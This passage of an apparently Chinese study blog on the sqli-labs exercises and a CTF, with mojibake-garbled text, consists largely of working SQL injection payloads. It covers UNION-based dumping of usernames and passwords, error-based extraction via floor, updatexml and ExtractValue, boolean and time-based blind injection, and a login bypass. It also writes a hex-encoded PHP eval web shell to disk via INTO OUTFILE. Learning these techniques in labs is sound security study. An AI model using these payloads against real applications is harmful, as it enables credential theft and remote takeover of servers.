<h4 id="æŸ¥è¯¢åˆ—å"><a href="#æŸ¥è¯¢åˆ—å" class="headerlink" title="æŸ¥è¯¢åˆ—å"></a>æŸ¥è¯¢åˆ—å</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">group_concat(flag),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom flag<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">21232</span>f297a57a5a743894a0e4a801fc3<span class="number">-084e0343</span>a0486ff05530df6c705c8bb4<span class="operator">-</span>a4346e75cc1dd161a8d57f3b2d5d82d0&#125;</span><br><span class="line"></span><br><span class="line">ZLCTF&#123;<span class="number">5</span>acb72b8<span class="number">-137</span>f<span class="number">-4</span>daa<span class="operator">-</span>a647<span class="number">-340</span>b72101d4b&#125;</span><br><span class="line">Your Password:admin,guest,virink</span><br><span class="line"></span><br><span class="line">schema_name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> frfromom infoorrmation_schema.schemata<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">information_schema,performance_schema,mysql,test,ctftraining,ctf</span><br><span class="line">ctf:flag,users</span><br></pre></td></tr></table></figure>

<p>ä¸<code>tables</code>è¡¨ç›¸ä¼¼ï¼Œ<code>information_schema</code>åº“ä¸­æœ‰ä¸€ä¸ª<code>columns</code>è¡¨ï¼Œå­˜æœ‰æ‰€æœ‰æ•°æ®åº“çš„åˆ—åã€‚ä¸Šé¢è¯­å¥è¡¨ç¤ºï¼ŒæŸ¥è¯¢<code>security</code>åº“ä¸­çš„<code>users</code>è¡¨ä¸­çš„æ‰€æœ‰åˆ—åã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921061.png" alt="image-20240911234752459"></p>
<h4 id="æŸ¥è¯¢åˆ—è¡¨ä¸­çš„å†…å®¹"><a href="#æŸ¥è¯¢åˆ—è¡¨ä¸­çš„å†…å®¹" class="headerlink" title="æŸ¥è¯¢åˆ—è¡¨ä¸­çš„å†…å®¹"></a>æŸ¥è¯¢åˆ—è¡¨ä¸­çš„å†…å®¹</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921503.png" alt="image-20240911235254031"></p>
<h3 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h3><p>ä¼ å…¥<code>?id=1</code>ï¼Œæ­£å¸¸å›æ˜¾</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921192.png" alt="image-20241029144140515" style="zoom:50%;" />

<p>ä¼ å…¥<code>?id=1&#39;</code>ï¼Œå›æ˜¾çš„æŠ¥é”™ä¸­æ²¡æœ‰æ˜¾ç¤ºæˆ‘ä»¬ä¼ å…¥çš„æ•°å­—</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921075.png" alt="image-20241029144207150" style="zoom: 50%;" />

<p>ä¼ å…¥<code>?id=1--+</code>ï¼Œæ­£å¸¸å›æ˜¾</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922959.png" alt="image-20241029144240783" style="zoom:50%;" />

<p>å› æ­¤å¾—çŸ¥æœ¬å…³æ˜¯åŸºäºæŠ¥é”™çš„æ•°å­—å‹æ³¨å…¥</p>
<h3 id="å•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#å•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"></a>å•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥</h3><p>ç¬¬ä¸€å…³çš„é—­åˆç¬¦å·æ˜¯<code>&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922074.png" alt="image-20241029143718824"></p>
<p>æœ¬å…³çš„é—­åˆç¬¦å·å˜æˆäº†<code>&#39;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922354.png" alt="image-20241029143849314"></p>
<h3 id="åŒå¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#åŒå¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="åŒå¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"></a>åŒå¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥</h3><p>ä¼ å…¥<code>?id=1&#39;</code>ï¼Œä¾æ—§å›æ˜¾æ­£å¸¸ï¼Œè¿™æ—¶å€™å¯ä»¥çŒœæµ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯åŒå¼•å·é—­åˆ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922686.png" alt="image-20241029145629173" style="zoom:50%;" />

<p>ä¼ å…¥<code>?id=1&quot;</code>ï¼Œæ ¹æ®æŠ¥é”™å›æ˜¾ç¡®å®šäº†ï¼Œé—­åˆç¬¦å·æ˜¯<code>&quot;)</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922751.png" alt="image-20241029145816812"></p>
<h3 id="é€šè¿‡å‡½æ•°æŠ¥é”™æ³¨å…¥"><a href="#é€šè¿‡å‡½æ•°æŠ¥é”™æ³¨å…¥" class="headerlink" title="é€šè¿‡å‡½æ•°æŠ¥é”™æ³¨å…¥"></a>é€šè¿‡å‡½æ•°æŠ¥é”™æ³¨å…¥</h3><h4 id="é€šè¿‡flooræŠ¥é”™"><a href="#é€šè¿‡flooræŠ¥é”™" class="headerlink" title="é€šè¿‡flooræŠ¥é”™"></a>é€šè¿‡<code>floor</code>æŠ¥é”™</h4><p><strong>è¯¥æ–¹æ³•æœ€å¤šå›æ˜¾<code>64</code>ä¸ªå­—ç¬¦ã€‚</strong></p>
<p>çˆ†æ•°æ®åº“ã€ç‰ˆæœ¬ã€ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ?id=1&#x27;å’Œ?id=-1&#x27;éƒ½è¡Œ</span><br><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,     #åˆ©ç”¨ : éš”å¼€æ•°æ®åº“åç§°</span><br><span class="line">    (SELECT database()),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br><span class="line">#ååŠæ®µæ ¼å¼:as xxx from è¡¨å group by xxx--+</span><br></pre></td></tr></table></figure>

<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>çˆ†åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<p>çˆ†å†…å®¹ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨<code>group_concat()</code>ä¸è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT count(*),0,concat(</span><br><span class="line">    0x3a,</span><br><span class="line">    (SELECT username FROM users limit 1),   #passwordå’Œusernameéƒ½åªèƒ½çˆ†å‡ºusername</span><br><span class="line">    0x3a,</span><br><span class="line">    floor(rand(0)*2)</span><br><span class="line">) as x FROM information_schema.tables group by x--+</span><br></pre></td></tr></table></figure>

<h4 id="updatexmlæŠ¥é”™"><a href="#updatexmlæŠ¥é”™" class="headerlink" title="updatexmlæŠ¥é”™"></a><code>updatexml</code>æŠ¥é”™</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><strong>æœ€å¤šå›æ˜¾<code>32</code>ä¸ªå­—ç¬¦ã€‚</strong></p>
<p>â€‹	<code>updatexml()</code>ä½¿ç”¨æ—¶ï¼Œå½“<code>xpath_string</code>æ ¼å¼å‡ºç°é”™è¯¯ï¼Œ<code>masql</code>ä¼šæŠ¥å‡ºè¯­æ³•é”™è¯¯ï¼Œè€Œæ‰§è¡Œç»“æœä¹Ÿåœ¨é”™è¯¯é‡Œã€‚å¯¹äº<code>select * FROM test WHERE id=1 AND updatexml(1,0x7e,1);</code>ï¼Œå…¶ä¸­<code>0x7e</code>æ˜¯<code>~</code>ï¼Œå…¶ä¸å±äº<code>xpath</code>è¯­æ³•æ ¼å¼ï¼Œå› æ­¤æŠ¥å‡º<code>xpath</code>è¯­æ³•é”™è¯¯ã€‚<br>åªæœ‰åœ¨<code>payload</code>è¿”å›çš„ä¸æ˜¯<code>xml</code>æ ¼å¼æ‰ä¼šç”Ÿæ•ˆã€‚</p>
<h5 id="æ³¨å…¥æµç¨‹"><a href="#æ³¨å…¥æµç¨‹" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><p>çˆ†æ•°æ®åº“ã€ç‰ˆæœ¬å·ã€ç”¨æˆ·å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ä¼ å…¥ ?id=1&#x27;+payload</span><br><span class="line">#payloadå¦‚ä¸‹</span><br><span class="line">AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><strong><code>concat()</code>æ˜¯è¿æ¥å‡½æ•°ã€‚</strong></p>
<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>çˆ†åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27;),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p>çˆ†å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(username) FROM users),1,32),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p><strong>åˆ©ç”¨<code>substr()</code>å‡½æ•°ç»•è¿‡å­—æ•°é™åˆ¶ï¼Œçˆ†å‡ºæ‰€æœ‰å†…å®¹ã€‚</strong></p>
<h4 id="ExtractValueæŠ¥é”™"><a href="#ExtractValueæŠ¥é”™" class="headerlink" title="ExtractValueæŠ¥é”™"></a><code>ExtractValue</code>æŠ¥é”™</h4><p><strong>æœ€å¤šå›æ˜¾<code>32</code>ä¸ªå­—ç¬¦ã€‚</strong></p>
<p>çˆ†æ•°æ®åº“ã€ç‰ˆæœ¬å·ã€ç”¨æˆ·å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(0x7e,(SELECT database()),0x7e))--+</span><br></pre></td></tr></table></figure>

<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>çˆ†åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27; ),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>çˆ†å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(password) FROM users),1,31),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<h2 id="Lass-7æ–‡ä»¶å†™å…¥"><a href="#Lass-7æ–‡ä»¶å†™å…¥" class="headerlink" title="Lass-7æ–‡ä»¶å†™å…¥"></a><code>Lass-7</code>æ–‡ä»¶å†™å…¥</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/7-58/p/14101610.html">Mysqlæ³¨å…¥ä¸­çš„outfileã€dumpfileå‡½æ•°è¯¦è§£ - gxy* - åšå®¢å›­</a></p>
<h4 id="into-outfileå‘½ä»¤"><a href="#into-outfileå‘½ä»¤" class="headerlink" title="into outfileå‘½ä»¤"></a><code>into outfile</code>å‘½ä»¤</h4><p>è¿ç”¨è¯¥å‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT...into outfile &#x27;ç»å¯¹è·¯å¾„&#x27;</span><br><span class="line">SELECT 1,2,3 into outfile &#x27;ç»å¯¹è·¯å¾„&#x27;</span><br><span class="line">SELECT null,0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e,null</span><br><span class="line">	into outfile &#x27;ç»å¯¹è·¯å¾„&#x27;</span><br><span class="line">#0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3eæ˜¯&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;å¯¹åº”æ¯ä¸ªå­—ç¬¦çš„åå…­è¿›åˆ¶è¿æˆçš„</span><br><span class="line"></span><br><span class="line">0x3c3f70687020406576616c285f504f53545b227368656c6c225d293b203f3e</span><br></pre></td></tr></table></figure>

<p>â€‹	<code>0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e</code>æ˜¯<?php @eval($_POST["shell"]); ?>å¯¹åº”æ¯ä¸ªå­—ç¬¦çš„åå…­è¿›åˆ¶è¿æˆçš„ã€‚</p>
<h5 id="secure-file-privå‚æ•°"><a href="#secure-file-privå‚æ•°" class="headerlink" title="secure_file_privå‚æ•°"></a><code>secure_file_priv</code>å‚æ•°</h5><p>â€‹	å› ä¸ºæ¶‰åŠåˆ°åœ¨æœåŠ¡å™¨ä¸Šå†™å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥<code>into outfile</code>å‡½æ•°èƒ½å¦æˆåŠŸæ‰§è¡Œå—åˆ°å‚æ•°<code>secure_file_priv</code>çš„å½±å“ï¼Œå¯ä»¥åˆ©ç”¨<code>select @@secure_file_priv</code>å‘½ä»¤æŸ¥è¯¢å…¶å€¼ã€‚</p>
<ul>
<li>å½“<code>secure_file_priv=&#39;&#39;</code>æ—¶ï¼Œå¯¹å¯¼å…¥å¯¼å‡ºæ— é™åˆ¶</li>
<li>å½“ä¸ºæŒ‡å®šçš„ç›®å½•æ—¶ï¼Œåªèƒ½å‘æŒ‡å®šçš„ç›®å½•å¯¼å…¥å¯¼å‡º</li>
<li>å½“<code>secure_file_priv=NULL</code>æ—¶ï¼Œç¦æ­¢å¯¼å…¥å¯¼å‡ºåŠŸèƒ½</li>
</ul>
<h5 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><ul>
<li>çŸ¥é“ç»å¯¹è·¯å¾„</li>
<li>åœ¨æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­å«æœ‰é…ç½®é¡¹<code>secure_file_priv=&#39;&#39;</code></li>
<li>å…·æœ‰<code>root</code>æƒé™</li>
</ul>
<p>è¿˜æœ‰<code>into dumpfile()</code>å’Œ<code>load_file()</code>è¿™ä¸¤ä¸ªå‡½æ•°ä»¥åå¯èƒ½ä¹Ÿä¼šç”¨åˆ°ã€‚</p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p><a href="https://blog.csdn.net/Waffle666/article/details/111465709">SQLæ³¨å…¥ä¹‹å¸ƒå°”ç›²æ³¨â€”â€”sql-labç¬¬å…«å…³</a></p>
<p><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131?utm_source=app">å¸ƒå°”ç›²æ³¨è¯¦è§£</a></p>
<h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p>è®¾ç½®å­—ç¬¦ä¸²<code>str=&#39;hmhwazyt5799&#39;</code></p>
<ul>
<li><code>length(str)</code>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œ<code>12</code></li>
<li><code>left(str,1)</code>è¿”å›å­—ç¬¦ä¸²<code>str</code>çš„ç¬¬<code>1</code>ä¸ªå­—ç¬¦ï¼Œ<code>h</code></li>
<li><code>ascii(left(str,1))</code>è¿”å›<code>h</code>çš„<code>ascii</code>ç ï¼Œ<code>49</code></li>
<li><code>substr((str),9,4)</code>è¿”å›<code>str</code>ä¸­ä»ç¬¬<code>9</code>ä¸ªå­—ç¬¦å¼€å§‹é•¿åº¦ä¸º<code>4</code>çš„å­—ç¬¦ä¸²ï¼Œ<code>5799</code></li>
</ul>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922873.png" alt="image-20241031214502415" style="zoom:50%;" />

<h3 id="æ³¨å…¥æµç¨‹-1"><a href="#æ³¨å…¥æµç¨‹-1" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><p>æ³¨ï¼šå‰é¢æ±‚é—­åˆç¬¦å·ç•¥è¿‡ï¼Œä¼ å…¥<code>?id=1&#39;+payload</code>å³å¯ã€‚</p>
<ul>
<li><strong>çˆ†åº“åé•¿åº¦</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (length(database())=8)</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å˜é‡</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923243.png" alt="image-20241031182917813" style="zoom:50%;" />

<p>è®¾ç½®<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923213.png" alt="image-20241031183010480" style="zoom:50%;" />

<p>çˆ†ç ´</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923801.png" alt="image-20241031182811644" style="zoom:50%;" />

<p>æˆåŠŸç¡®å®šæ•°æ®åº“åé•¿åº¦ä¸º<code>8</code></p>
<ul>
<li><strong>çˆ†æ•°æ®åº“</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (left(database(),1)=&#x27;s&#x27;)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(left(database(),1))=57)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(substr(database(),1,1))=57)</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å˜é‡å’Œæ”»å‡»æ–¹å¼ï¼Œè¿™é‡Œé‡‡å–<code>Clustter bomb</code>æ”»å‡»</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923890.png" alt="QQ_1730382622041" style="zoom:50%;" />

<p>è®¾ç½®<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923248.png" alt="image-20241031215143950" style="zoom:50%;" />

<img src="https://gitee.com/Qwen11/pic/raw/master/202410312152072.png" alt="image-20241031215206013" style="zoom:50%;" />

<p>çˆ†ç ´</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923274.png" alt="image-20241031215748696"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924988.png" alt="image-20241031215539921"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924216.png" alt="image-20241031215559791"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925373.png" alt="image-20241031215853258"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925770.png" alt="image-20241031220417430"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925213.png" alt="image-20241031220443739"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925481.png" alt="image-20241031220522121"><br>!<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926572.png" alt="image-20241031220655801"></p>
<p>æˆåŠŸç¡®å®šæ•°æ®åº“<code>security</code></p>
<ul>
<li><strong>çˆ†è¡¨ä¸ªæ•°</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(table_name)</span><br><span class="line">     FROM information_schema.tables </span><br><span class="line">     WHERE table_schema=database())=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å„ä¸ªè¡¨é•¿åº¦</strong></li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong><code>length</code>æ‹¬åœ¨<code>select</code>å¤–ï¼ŒäºŒè€…é—´è¦åŠ ä¸¤ä¸ªæ‹¬å·ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926656.png" alt="image-20241101144846331" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926738.png" alt="image-20241101144922983" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926472.png" alt="image-20241101144948805" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†ç¬¬ä¸‰ä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1))=7</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926955.png" alt="image-20241101145035538" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†ç¬¬å››ä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1))=5</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å„ä¸ªè¡¨å</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ç¬¬å››ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦uçš„asciiç </span><br><span class="line">AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),1,1))=117</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†æŒ‡å®šè¡¨ä¸­åˆ—ä¸ªæ•°</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å„ä¸ªåˆ—é•¿åº¦</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#usersè¡¨ä¸­çš„ç¬¬2åˆ—usernameçš„é•¿åº¦</span><br><span class="line">AND length((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å„ä¸ªåˆ—å</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#usersè¡¨ä¸­çš„ç¬¬3åˆ—passwordçš„ç¬¬2ä¸ªå­—ç¬¦çš„asciiç </span><br><span class="line">AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 2,1),2,1))=97</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å­—æ®µä¸ªæ•°</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(username) FROM users)=14</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å„ä¸ªå­—æ®µé•¿åº¦</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#usersè¡¨ä¸­çš„usernameåˆ—çš„ç¬¬1ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line">AND length((SELECT username FROM users LIMIT 0,1))=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>çˆ†å­—æ®µ</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68</span><br></pre></td></tr></table></figure>

<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>â€‹	æ—¶é—´ç›²æ³¨ä¸å¸ƒå°”ç›²æ³¨ç›¸ä¼¼ï¼Œä¸åŒçš„æ˜¯æ‰§è¡Œæ­£ç¡®ä¸å¦çš„å‚è€ƒï¼Œç”±æ˜¯å¦æŠ¥é”™å˜æˆäº†æ˜¯å¦æ‰§è¡Œ<code>sleep()</code>å‡½æ•°ã€‚æµ‹è¯•çš„æ ¸å¿ƒè¯­å¥æ˜¯<code>AND if(æŸ¥è¯¢è¯­å¥,sleep(3),1)</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND if(length(database())=8,sleep(3),1)</span><br><span class="line">#å¦‚æœ length(database())=8 ä¸ºçœŸ(1),æ‰§è¡Œsleep(3)</span><br><span class="line">AND elt(length(database())=8,sleep(3))</span><br><span class="line">#å¦‚æœ length(database())=8 ä¸ºçœŸ(1),æ‰§è¡Œsleep(3)</span><br></pre></td></tr></table></figure>

<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><code>POST</code></h2><h3 id="Lass-11"><a href="#Lass-11" class="headerlink" title="Lass-11"></a><code>Lass-11</code></h3><p>è¾“å…¥<code>1&#39;</code>å›æ˜¾ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥æ¨æ–­å‡ºä¼ å‚æ ¼å¼æ˜¯<code>username=&#39;&#39; and password=&#39;&#39;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926143.png" alt="image-20241101193611754" style="zoom:50%;" />

<p>è¾“å…¥<code>1&#39; or 1=1#</code>ï¼Œå¾—<code>username=&#39;1&#39; or 1=1#&#39;</code>ï¼Œå›æ˜¾æ­£å¸¸ï¼Œ<strong>è¿™é‡Œç”¨<code>--+</code>æ³¨é‡Šä¼šå¤±è´¥ï¼Œè¦ç”¨<code>#</code>æ³¨é‡Š</strong></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926391.png" alt="image-20241101194908735" style="zoom:50%;" />

<p>æ¥ä¸‹æ¥å°±æŒ‰ç…§<code>Pass-1</code>çš„æ€è·¯ï¼Œä½¿ç”¨**<code>union</code>è”åˆæŸ¥è¯¢**æ³¨å…¥å³å¯</p>
